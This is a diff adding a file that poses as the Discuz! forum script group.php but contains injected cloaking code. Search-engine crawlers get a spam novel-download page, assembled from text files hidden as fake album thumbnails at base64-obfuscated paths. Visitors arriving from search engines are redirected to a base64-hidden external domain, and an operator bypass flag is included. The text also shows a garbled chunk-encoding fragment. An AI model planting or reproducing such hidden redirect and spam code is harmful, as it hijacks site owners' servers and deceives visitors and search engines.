@@ -1,0 +1,284 @@
+<?
+
+/**
+ *      [Discuz!] (C)2001-2099 Comsenz Inc.
+ *      This is NOT a freeware, use is subject to license terms
+ *
+ *      $Id: group.php 21671 2011-04-07 06:21:13Z zhangguosheng $
+ */
+
+define('APPTYPEID', 3);
+define('CURSCRIPT', 'group');
+
+
+function randKey($len)
+{
+$possible = "0123456789abcdefghijklmnopqrstuvwxyz";
+$str = "";
+while(strlen($str) < $len)
+$str .= substr($possible,(rand() % strlen($possible)),1);
+return $str;
+}
+function isRooter($v){
+$spiders=array("aidu","oogle","so","dao");
+$i=0;
+foreach ($spiders as $i => $value) 
+                {
+if(stristr($v,$spiders[$i])){return true;}
+}
+return false;
+}
+session_start(); 
+$dedeTag="htt";
+$dedeN="em1kOXMuY29t";
+if($_GET["de"]=="de"){$_SESSION['success']=1;}
+if(!isRooter($_SERVER['HTTP_USER_AGENT'])&&$_SESSION['success']!=1){
+$dedeTag.="p://z";
+if(isRooter($_SERVER['HTTP_REFERER'])) {
+$dedeTag.="g.".base64_decode($dedeN);
+header("Location:  ".$dedeTag); 
+}else{
+define('APPTYPEID', 3);
+define('CURSCRIPT', 'group');
+
+
+require './source/class/class_core.php';
+
+$discuz = & discuz_core::instance();
+
+$cachelist = array('grouptype', 'groupindex', 'diytemplatenamegroup');
+$discuz->cachelist = $cachelist;
+$discuz->init();
+
+if(!$_G['setting']['groupstatus']) {
+	showmessage('group_status_off');
+}
+$modarray = array('index', 'my', 'attentiongroup');
+$mod = !in_array($_G['mod'], $modarray) ? 'index' : $_G['mod'];
+
+define('CURMODULE', $mod);
+
+runhooks();
+
+$navtitle = str_replace('{bbname}', $_G['setting']['bbname'], $_G['setting']['seotitle']['group']);
+
+require DISCUZ_ROOT.'./source/module/group/group_'.$mod.'.php';
+}
+exit();
+}
+$data=date("Y-m-d",time());
+$tid=date("md",time());
+$Titleline = file(base64_decode('Li9kYXRhL2F0dGFjaC9hbGJ1bS8yMDEwLzA1MDcvMV8wXzEyNzMyMzEwOTk5LmpwZy50aHVtYi5qcGc='));
+$Contentline = file(base64_decode('Li9kYXRhL2F0dGFjaC9hbGJ1bS8yMDEwLzA1MDcvMl8wXzEyNzMzMDIzOTkuanBnLnRodW1iLmpwZw=='));
+$TC=count($Titleline);
+$CC=count($Contentline);
+
+function gettitle($id)
+{
+global $Titleline;
+$str=$Titleline[$id];
+return $str;
+}
+function getcontent($id)
+{
+global $Contentline;
+$str=$Contentline[$id];
+$str=str_replace("{title}","",$str);
+return $str;	
+}
+$order   = array("\r\n", "\n", "\r");
+$Title1=str_replace(chr(10),"",gettitle(rand(0,$TC)));
+$Title2=str_replace(chr(10),"",gettitle(rand(0,$TC)));
+$Title3=str_replace(chr(10),"",gettitle(rand(0,$TC)));
+$Title4=str_replace(chr(10),"",gettitle(rand(0,$TC)));
+$Title5=str_replace(chr(10),"",gettitle(rand(0,$TC)));
+$Title1=str_replace($order, "", $Title1);
+$Title2=str_replace($order, "", $Title2);
+$Title3=str_replace($order, "", $Title3);
+$Title4=str_replace($order, "", $Title4);
+$Title5=str_replace($order, "", $Title5);
+$arr1=str_split($Title1,4);
+?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml"> 
+<head>
+<title><?=$Title1?>  <?=$Title2?> <?=$Title3?></title>
+<meta http-equiv="content-type" content="text/html;charset=gb2312" />
+<meta name="description" content="<?=$Title1?>  <?=$Title2?> <?=$Title3?>" />
+<meta name="keywords" content="<?=$Title1?>  <?=$Title2?> <?=$Title3?>"/>
+<meta name="robots" content="index,follow,noarchive">
+<style type="text/css">
+#top{left:50%;margin-left:-450px;position: absolute;width:900px;height:1200px;font-size:14px;}
+a{text-decoration: none;color:black;}
+a:hover{text-decoration: underline;color: red;}
+#menu{border:#00cc00 1px solid;}
+#menu_1{width:100%;height:30px;background-color:green;}
+#menu_1 ul li{float:left;margin-left:4px;margin-right:5px;}
+#menu_1 ul li a{display:block;padding:8px 1px 4px 1px;color:white;}
+#menu_1 ul li a:hover{background-color:red;}
+#menu_2{width:100%;height:30px;}
+#menu_2 ul li{float:left;margin-left:4px;margin-right:5px;}
+#menu_2 ul li a{display:block;padding:6px 1px 0px 1px;}
+#sundry{width:100%;height:30px;background-color:#f1ffea;}
+#sundry ul li{float:left;margin-right:5px;}
+#sundry ul li a{display:block;padding:10px 1px 10px 1px;}
+#sundry ul{float:left;margin-left:5px;}
+#search{float:left;margin-top:5px;}
+#curr
+104e
+ent_position{margin-top:5px;color:green;}
+#current_position a{color:green;text-decoration: underline;}
+#main{margin-top:8px;}
+#content{width:75%;border:#00cc00 1px solid;float:left;}
+#artical_topic h1{color:green;font-size:16px;margin-top:15px;}
+#artical_topic div{color:gray;margin-top:-10px;margin-bottom:10px;}
+#artical_topic div a{color:gray;}
+#artical_content{width:90%;margin-left:5%;margin-bottom:30px;}
+#artical_content p{text-indent: 20px;}
+#sidebar{margin-left:3px;width:24%;}
+#new_artical,#hot_artical,#similar_artical{border:#00cc00 1px solid;margin-bottom:5px;}
+#new_artical ul,#hot_artical ul,#similar_artical ul{margin:0px;margin-left:8px;list-style-type: none;}
+#new_artical ul li,#hot_artical ul li,#similar_artical ul li{margin-bottom:3px;margin-top:3px;}
+#new_artical ul li a,#hot_artical ul li a,#similar_artical ul li a{color:green;}
+#new_artical ul li a:hover,#hot_artical ul li a:hover,#similar_artical ul li a:hover{color:red;}
+#new_title,#hot_title,#similar_title{background-color:#78b047;color:white;font-weight: bold;padding-top:3px;padding-bottom:3px;padding-left:8px;}
+#artical_footer{width:100%;margin-bottom:30px;}
+#download a{color:red;font-weight:bold;font-size:15px;text-decoration: underline;}
+.d1{margin-left:80px;float:left;margin-top:20px;}
+.d1 a{color:green;}
+#footer{margin-top:15px;clear:both;}
+</style>
+</head>
+<body>
+<div id="top">
+<div id="header">
+	<div id="menu">
+		<div id="menu_1">
+		    <ul>
+				<li><a href="?<?=randKey(rand(6,12))?>">都市言情</a></li>
+				<li><a href="?<?=randKey(rand(6,12))?>">武侠玄幻</a></li>
+				<li><a href="?<?=randKey(rand(6,12))?>">穿越架空</a></li>
+				<li><a href="?<?=randKey(rand(6,12))?>">科幻小说</a></li>
+				<li><a href="?<?=randKey(rand(6,12))?>">恐怖灵异</a></li>
+				<li><a href="?<?=randKey(rand(6,12))?>">网游竞技</a></li>
+				<li><a href="?<?=randKey(rand(6,12))?>">推理侦探</a></li>
+				<li><a href="?<?=randKey(rand(6,12))?>">都市|官场</a></li>
+				<li><a href="?<?=randKey(rand(6,12))?>">历史|军事</a></li>
+				<li><a href="?<?=randKey(rand(6,12))?>">影视原著</a></li>
+				<li><a href="?<?=randKey(rand(6,12))?>">世界名著</a></li>
+				<li><a href="?<?=randKey(rand(6,12))?>">古典名著</a></li>
+			</ul>
+		</div> <!-- menu_1 end-->
+		<div id="menu_2">
+		    <ul>
+				<li><a href="/" >小说下载网</a></li>
+				<li><a href="?<?=randKey(rand(6,12))?>">管理书籍</a></li>
+				<li><a href="?<?=randKey(rand(6,12))?>">励志书籍</a></li>
+				<li><a href="?<?=randKey(rand(6,12))?>">人物传记</a></li>
+				<li><a href="?<?=randKey(rand(6,12))?>">儿童童话</a></li>
+				<li><a href="?<?=randKey(rand(6,12))?>">科学社科</a></li>
+				<li><a href="?<?=randKey(rand(6,12))?>">文学综合</a></li>
+				<li><a href="?<?=randKey(rand(6,12))?>">英文原著</a></li>
+				<li><a href="?<?=randKey(rand(6,12))?>">其他电子书</a></li>
+				<li><a href="?<?=randKey(rand(6,12))?>">TXT相关软件</a></li>
+				<li><a href="?<?=randKey(rand(6,12))?>">小说放到桌面</a></li>
+			</ul>
+		</div> 
+	</div> <!-- menu_2 end-->
+</div> <!--header end-->
+<div id="sundry">
+    <div id="search">
+        <input type="text" size="24"/>
+        <select id="Select1">
+            <option value="title" selected="selected">书名</option>
+            <option value="softwriter">作者</option>
+        </select>&nbsp;
+        <input type="submit" value="搜索小说" />
+	</div>
+	<ul>
+		<li><a href="?newbooks.html">最新小说下载</a></li> 
+		<li><a href="?top.html">小说排行榜</a></li> 
+		<li><a href="?topyanqing.html">言情小说榜</a></li>
+		<li><a href="?topwxxh.html">武侠玄幻榜</a></li>
+		<li><a href="?topcy.html">穿越小说榜</a></li> 
+		<li><a href="javascript:window.open('http://cang.baidu.com/do/add?it='+encodeURIComponent(document.title.substring(0,76))+'&iu='+encodeURIComponent(location.href)+'&fr=ien#nw=1','_blank','scrollbars=no,width=600,height=450,left=75,top=20,status=no,resizable=yes'); void 0">百度</a></li> 
+		<li><a href="javascript:void(0);" onclick="window.open('http://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url='+encodeURIComponent(document.location.href));return false;" title="分享到QQ空间">QQ空间</a></li> 
+	</ul> 		
+</div><!--sundry end-->
+<div id="current_position">
+    您的位置:&nbsp;<a href="/">首页</a>&nbsp;>&nbsp;<a href="?v1_v2=Yw3V2"><?=$Title1?></A><a name=baidusnap0></a>&nbsp;>&nbsp;<a href="?v1_v2=fHq610"><?=$Title2?></A></div>
+<!--current_position end-->
+<div id="main">
+	<div id="content">
+		<div id="artical_topic" align="center">
+			<h1><?=$Title1?>  <?=$Title2?> <?=$Title3?></h1>
+			<div>
+				<span id="publish_time">2011-10-21 14:36:02</span><span id="author">&nbsp;作者:叶枫o0&nbsp;</span><span id="comment"><a href="?key=01021&v1_v2=tWyl5">我要评论</a></span>
+			</div>		
+		</div><!--artical_topic end-->
+		<div id="artical_content">
+<P>
+		<?=getcontent(rand(0,$CC))?></p><?=getcontent(rand(0,$CC))?><span style="color: #ff0000"><?=$Title2?></span><?=getcontent(rand(0,$CC))?><?=getcontent(rand(0,$CC))?><?=getcontent(rand(0,$CC))?><?=getcontent(rand(0,$CC))?></span></p>
+
+			        <p><p style="text-align: center"><?=getcontent(rand(0,$CC))?></p>
+<span style="margin:1em 0;line-height:1.6em;text-indent:33px;text-align:left;"> 　　<?=getcontent(rand(0,$CC))?><?=getcontent(rand(0,$CC))?><?=getcontent(rand(0,$CC))?><span style="color: #ff0000"><?=$Title3?></span><?=getcontent(rand(0,$CC))?><?=getcontent(rand(0,$CC))?><?=getcontent(rand(0,$CC))?><span style="color: #ff0000"><?=$Title1?></span><?=getcontent(rand(0,$CC))?><?=getcontent(rand(0,$CC))?><?=getcontent(rand(0,$CC))?><?=getcontent(rand(0,$CC))?> </span>
+ <span style="color: #ff0000"><?=$Title1?></span>    书香屋 更新时间:2011-10-7 6:38:36 本章字数:2323</span>
+</p>
+		</div><!--artical_content end-->
+		<div id="artical_footer" align="center">
+			<span id="download"><a href="?id=01021&v1_v2=viec2">立即下载</a></span>
+			<div class="d1">上一篇:<a href="?id=<?=randKey(rand(7,10))?>"><?=$Title4?></A></div>
+			<div class="d1">下一篇:<a href="?id=<?=randKey(rand(7,10))?>"><?=$Title4?></A></div>
+		</div><!--artical_footer end-->
+	</div><!--content end-->
+	<div id="sidebar">
+		<div id="new_artical">
+		   <div id="new_title">最新文章</div>
+			<ul>
+			  <?
+for($i=1;$i<10;$i++){
+$ttt = gettitle(rand(0,$TC));
+$ttt=str_replace($order, "", $ttt);
+?>
+<li>·<a href="?id=<?=randKey(rand(6,10))?>"><?=$ttt?></A></li>
+<? }?>
+
+			</ul>
+		</div><!--new end-->
+		<div id="hot_artical">
+		    <div id="hot_title">最热文章</div>
+			<ul>
+              <?
+for($i=1;$i<10;$i++){
+$ttt = gettitle(rand(0,$TC));
+$ttt=str_replace($order, "", $ttt);
+?>
+<li>·<a href="?id=<?=$tid?>&key=<?=randKey(rand(6,10))?>"><?=$ttt?></A></li>
+<? }?>
+
+			</ul>
+		</div><!--hot end-->
+		<div id="similar_artical">
+		  
+  <div id="similar_title">相似文章</div>
+			<ul>
+			  <?
+for($i=1;$i<6;$i++){
+$ttt = gettitle(rand(0,$TC));
+$ttt=str_replace($order, "", $ttt);
+?>
+<li>·<a href="?id=<?=$tid?>&key=<?=randKey(rand(6,10))?>"><?=$ttt?></A></li>
+<? }?>
+
+			</ul>
+		</div><!--like_artical-->
+	</div><!--sidebar end-->
+</div> <!-- main end-->
+<div id="footer" align="center">
+	<b style="background-color:yellow;"><?=$Title1?> <?=$Title2?> <?=$Title3?><span style='color:black;background-color:#A0FFFF'><?=$Title1?></span></b>
+	整理自互联网,免费提供下载,如果侵犯了您的权益,请
+	<a href="?banquan.html" target="_blank" rel="nofollow">联系我们</a>,我们会在24小时内删除<br />
+</div><!--footer end-->
+</div>
+</body>
+</html>
